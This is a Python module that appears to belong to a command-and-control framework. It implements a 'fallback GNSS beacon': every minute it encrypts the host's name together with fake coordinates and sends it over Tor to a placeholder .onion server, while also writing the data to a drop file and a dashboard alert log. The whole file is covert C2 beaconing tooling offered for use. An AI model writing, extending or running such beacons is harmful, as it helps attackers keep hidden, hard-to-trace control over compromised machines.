#!/usr/bin/env python3
# File: modules/c2/fallback_gnss_beacon_c2.py

import os
import json
import time
import base64
import random
import socket
import requests
import subprocess
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Random import get_random_bytes

# Configuration
BEACON_INTERVAL = 60  # seconds
GNSS_BEACON_FILE = "dropzone/gnss_beacon.dat"
KEY_FILE = "secrets/aes_beacon.key"
TOR_PROXY = "socks5h://127.0.0.1:9050"
FALLBACK_SERVER = "http://fallback-beacon.onion/api/recv"
DASHBOARD_ALERT = "webgui/alerts.json"

os.makedirs("dropzone", exist_ok=True)
Path(DASHBOARD_ALERT).parent.mkdir(parents=True, exist_ok=True)

def log(msg):
    print(f"[{datetime.utcnow()}] {msg}")

def load_key():
    if not os.path.exists(KEY_FILE):
        key = get_random_bytes(32)
        with open(KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    return key

def generate_gnss_payload():
    # Simulated fake GNSS coordinates for the beacon
    lat = round(random.uniform(-90, 90), 6)
    lon = round(random.uniform(-180, 180), 6)
    alt = round(random.uniform(100, 1000), 2)
    payload = {
        "timestamp": datetime.utcnow().isoformat(),
        "lat": lat,
        "lon": lon,
        "alt": alt,
        "agent": socket.gethostname()
    }
    return json.dumps(payload)

def encrypt_payload(data, key):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = data.encode().ljust((len(data) + 15) // 16 * 16, b"\x00")
    ciphertext = cipher.encrypt(padded_data)
    hmac = HMAC.new(key, ciphertext, digestmod=SHA256).digest()
    full_payload = iv + hmac + ciphertext
    return base64.b64encode(base64.b64encode(full_payload)).decode()

def write_beacon_file(data):
    with open(GNSS_BEACON_FILE, "w") as f:
        f.write(data)
    log(f"[+] GNSS beacon written to {GNSS_BEACON_FILE}")

def send_tor_beacon(data):
    try:
        import socks
        import urllib3
        from urllib3.contrib.socks import SOCKSProxyManager

        http = SOCKSProxyManager(
            proxy_url=TOR_PROXY,
            num_pools=1,
            timeout=5.0
        )

        r = http.request(
            "POST",
            FALLBACK_SERVER,
            headers={"Content-Type": "application/json"},
            body=json.dumps({"beacon": data})
        )
        log(f"[+] Beacon sent over Tor. Status: {r.status}")
    except Exception as e:
        log(f"[!] Tor beacon failed: {e}")

def alert_dashboard(payload):
    alert = {
        "timestamp": datetime.utcnow().isoformat(),
        "type": "gnss_beacon",
        "lat": payload["lat"],
        "lon": payload["lon"],
        "alt": payload["alt"],
        "agent": payload["agent"],
        "channel": "RF+Tor fallback"
    }
    try:
        if os.path.exists(DASHBOARD_ALERT):
            with open(DASHBOARD_ALERT, "r") as f:
                alerts = json.load(f)
        else:
            alerts = []
        alerts.append(alert)
        with open(DASHBOARD_ALERT, "w") as f:
            json.dump(alerts, f, indent=2)
    except Exception as e:
        log(f"[!] Failed to write dashboard alert: {e}")

def run_beacon_loop():
    key = load_key()
    while True:
        try:
            payload_json = generate_gnss_payload()
            encrypted = encrypt_payload(payload_json, key)
            write_beacon_file(encrypted)
            send_tor_beacon(encrypted)
            alert_dashboard(json.loads(payload_json))
        except Exception as e:
            log(f"[!] Beacon error: {e}")
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    log("[*] GNSS Fallback Beacon C2 started.")
    run_beacon_loop()
